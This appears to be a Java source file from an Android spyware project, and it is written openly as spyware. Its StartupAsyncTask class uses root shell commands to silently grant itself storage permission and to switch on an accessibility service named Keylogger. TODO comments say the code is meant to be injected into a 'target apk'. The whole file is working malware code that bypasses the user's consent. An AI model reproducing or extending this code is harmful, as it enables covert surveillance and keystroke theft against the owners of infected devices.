package com.example.cristianturetta.spyware;

import android.os.AsyncTask;
import android.util.Log;

import java.io.DataOutputStream;

public class StartupAsyncTask extends AsyncTask<Void, Void, Void> {

    final String packageName = "com.example.cristianturetta.spyware";

    @Override
    protected Void doInBackground(Void... params) {
        enableAccessibility();
        enableStoragePermissions();
        return null;
    }

    // TODO when injected into target apk it doesn't work anymore
    private void enableStoragePermissions(){
        Log.d("StartupAsyncTask", "Enabling Storage permissions...");
        try {
            Process process = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(process.getOutputStream());
            os.writeBytes("pm grant " + packageName + " android.permission.WRITE_EXTERNAL_STORAGE\n");
            os.flush();
            os.writeBytes("exit\n");
            os.flush();

            process.waitFor();
            if (process.exitValue() == 0){
                Log.d("StartupAsyncTask", "Storage permissions enabled");
            } else {
                Log.d("StartupAsyncTask", "Storage permissions not enabled, exit code:" + process.exitValue());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    // TODO when injected into target apk it doesn't work anymore
    private void enableAccessibility(){
        Log.d("StartupAsyncTask", "Enabling Accessibility Service...");
        try {
            Process process = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(process.getOutputStream());
            os.writeBytes("settings put secure enabled_accessibility_services " + packageName +"/"+ packageName + ".Keylogger\n");
            os.flush();
            os.writeBytes("settings put secure accessibility_enabled 1\n");
            os.flush();
            os.writeBytes("exit\n");
            os.flush();

            process.waitFor();
            if (process.exitValue() == 0){
                Log.d("StartupAsyncTask", "Accessibility Service enabled");
            } else {
                Log.d("StartupAsyncTask", "Accessibility Service not enabled, exit code:" + process.exitValue());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}